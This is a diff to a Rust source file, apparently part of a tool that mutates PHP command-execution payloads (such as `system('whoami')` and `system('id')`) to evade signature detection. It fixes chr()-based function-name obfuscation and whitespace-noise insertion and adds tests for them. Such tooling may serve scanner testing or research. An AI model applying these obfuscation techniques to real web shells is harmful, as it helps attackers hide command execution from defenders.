@@ -320,43 +320,44 @@ fn apply_primitive(payload: &str, primitive: &str, rng: &mut SplitMix64) -> Resu
 }
 
 /// A: rebuild lowercase function-name letters via chr(n) concatenation —
-/// `system(` becomes `chr(115).chr(121)…(`. Only the leading identifier
-/// of each call site is spliced (the terminal executor stays invocable).
+/// `system('cmd')` becomes `(chr(115).chr(121)…)('cmd')`. The wrapping
+/// parens are REQUIRED: PHP parses `chr(115).…('cmd')` as a call on the
+/// last chr's return value (dot binds looser than invocation); only the
+/// uniform-variable-callable form `(expr)(args)` invokes the rebuilt name.
 fn chr_splice(payload: &str, rng: &mut SplitMix64) -> String {
     let mut out = String::new();
     for (index, line) in payload.lines().enumerate() {
         if index > 0 {
             out.push('\n');
         }
-        if rng.draw().is_multiple_of(3) && line.contains("system(") {
-            let (head, _) = line.split_once("system(").unwrap_or((line, ""));
-            let spliced: String = "system"
-                .bytes()
-                .map(|byte| format!("chr({byte})"))
-                .collect::<Vec<_>>()
-                .join(".");
-            out.push_str(&format!("{head}{spliced}("));
-            let rest = line
-                .split_once("system(")
-                .map(|(_, tail)| tail)
-                .unwrap_or("");
-            out.push_str(rest);
-        } else {
-            out.push_str(line);
+        if rng.draw().is_multiple_of(3) && line.contains("system('") {
+            if let Some((head, rest)) = line.split_once("system('") {
+                if let Some((command, tail)) = rest.rsplit_once("')") {
+                    let spliced: String = "system"
+                        .bytes()
+                        .map(|byte| format!("chr({byte})"))
+                        .collect::<Vec<_>>()
+                        .join(".");
+                    out.push_str(&format!("{head}({spliced})('{command}'){tail}"));
+                    continue;
+                }
+            }
         }
+        out.push_str(line);
     }
     out
 }
 
-/// A: insert whitespace/comment noise inside call argument areas — breaks
-/// naive signature regexes without touching semantics.
+/// A: insert whitespace noise inside a zero-arg call's parentheses —
+/// breaks naive signature regexes without touching semantics. The WHOLE
+/// `()` pair is replaced with `(noise)` so the call stays balanced.
 fn special_chars_insert(payload: &str, rng: &mut SplitMix64) -> String {
     let noise = [" ", "\t", "\n", ""];
     let mut out = payload.to_string();
     for _ in 0..3 {
         if let Some(position) = out.find("();") {
             let insertion = noise[(rng.draw() % noise.len() as u64) as usize];
-            out.replace_range(position..position + 1, &format!("({insertion})"));
+            out.replace_range(position..position + 2, &format!("({insertion})"));
         }
     }
     out
@@ -781,7 +782,6 @@ mod tests {
 
     #[test]
     fn chr_splice_removes_the_literal_function_name() {
-        let rng = SplitMix64::new(7);
         let payload = "<?php\nsystem('whoami');\nsystem('id');\n?>";
         // Force at least one splice by scanning a few draws.
         let mut mutated = payload.to_string();
@@ -795,7 +795,29 @@ mod tests {
             mutated.contains("chr(115)"),
             "s = chr(115) must appear: {mutated}"
         );
-        let _ = rng;
+        // B4 fix: the rebuilt name must be WRAPPED in parens — the bare
+        // `chr(115).…('whoami')` form binds the args to the last chr()
+        // call, an undefined-function fatal.
+        assert!(
+            mutated.contains("))('"),
+            "uniform-variable-callable form required: {mutated}"
+        );
+        let opens = mutated.matches('(').count();
+        let closes = mutated.matches(')').count();
+        assert_eq!(opens, closes, "balanced parens: {mutated}");
+    }
+
+    #[test]
+    fn special_chars_insert_keeps_calls_balanced() {
+        let payload = "foo(); bar();";
+        let mutated = special_chars_insert(payload, &mut SplitMix64::new(3));
+        let opens = mutated.matches('(').count();
+        let closes = mutated.matches(')').count();
+        assert_eq!(opens, closes, "paren pairs stay balanced: {mutated}");
+        assert!(
+            !mutated.contains("());"),
+            "no double-close introduced: {mutated}"
+        );
     }
 
     #[test]
@@ -840,14 +862,32 @@ mod tests {
 
     #[test]
     fn constant_split_and_dead_code_preserve_statements() {
-        let mut rng = SplitMix64::new(11);
-        let payload = "<?php\n$x='abcdefghijkl';\n?>";
-        let split = constant_split(payload, &mut rng);
-        // The literal is either split into "a\".\"b form or left intact — both valid.
-        assert!(split.contains("$x=") && split.contains("';"));
+        // Double-quoted literal — the split executor's scan target (B5: the
+        // old single-quote input exercised zero split logic, the assertion
+        // was true of the untouched payload).
+        let payload = "<?php\n$x=\"abcdefghijkl\";\n?>";
+        let mut any_split = false;
+        for seed in 0..20 {
+            let split = constant_split(payload, &mut SplitMix64::new(seed));
+            if split.contains("\".\"") {
+                any_split = true;
+                // The split form reassembles to the same literal when the
+                // `"."` joiner and the extra quotes are removed.
+                let rejoined = split.replace("\".\"", "");
+                assert!(
+                    rejoined.contains("abcdefghijkl"),
+                    "split must reassemble: {rejoined}"
+                );
+                break;
+            }
+        }
+        assert!(any_split, "at least one seed must split the literal");
         let dead = dead_code_inject("<?php\nsystem('id');\n?>", &mut SplitMix64::new(5));
         assert!(dead.contains("system('id');"));
         assert!(dead.contains("$__"));
+        // The junk statement must not precede the open tag (text outside
+        // PHP tags is emitted raw).
+        assert!(dead.starts_with("<?php"));
     }
 
     #[test]
